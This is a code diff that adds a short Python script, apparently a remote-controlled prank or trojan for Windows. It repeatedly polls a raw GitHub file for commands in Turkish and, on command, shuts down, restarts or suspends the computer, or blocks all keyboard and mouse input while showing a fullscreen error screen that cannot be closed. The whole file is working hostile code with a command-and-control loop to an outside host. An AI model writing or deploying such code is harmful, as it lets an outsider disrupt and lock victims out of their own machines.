@@ -1,1 +1,68 @@
+import requests
+import os
+import ctypes
+import time
+import threading
+from tkinter import *
+from PIL import Image, ImageTk
+import io
+
+URL = "https://raw.githubusercontent.com/ASUSGAMERGX/denemee/refs/heads/main/uygulama"
+ERROR_IMAGE_URL = "https://www.elegantthemes.com/blog/wp-content/uploads/2020/08/000-http-error-codes.png"
+
+def get_command():
+    try:
+        response = requests.get(URL, timeout=2)
+        return response.text.strip().lower()
+    except:
+        return None
+
+def show_error_screen():
+    root = Tk()
+    root.attributes("-fullscreen", True)
+    root.config(bg="black")
+    root.attributes('-topmost', True)
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+    root.bind("<Escape>", lambda e: None)
+    try:
+        img_data = requests.get(ERROR_IMAGE_URL).content
+        img = Image.open(io.BytesIO(img_data))
+        img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()))
+        photo = ImageTk.PhotoImage(img)
+        label = Label(root, image=photo)
+        label.image = photo
+        label.pack()
+    except:
+        Label(root, text="ERROR", fg="red", bg="black", font=("Arial", 40)).pack()
+    root.mainloop()
+
+def disable_input():
+    try:
+        ctypes.windll.user32.BlockInput(True)
+    except:
+        pass
+
+def enable_input():
+    try:
+        ctypes.windll.user32.BlockInput(False)
+    except:
+        pass
+
+def execute_command(command):
+    if command == "kapat":
+        os.system("shutdown /s /t 0")
+    elif command == "yeniden":
+        os.system("shutdown /r /t 0")
+    elif command == "uyku":
+        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
+    elif command == "error":
+        threading.Thread(target=disable_input).start()
+        show_error_screen()
+        enable_input()
+
+while True:
+    komut = get_command()
+    if komut in ["kapat", "yeniden", "uyku", "error"]:
+        execute_command(komut)
+    time.sleep(0.1)
 
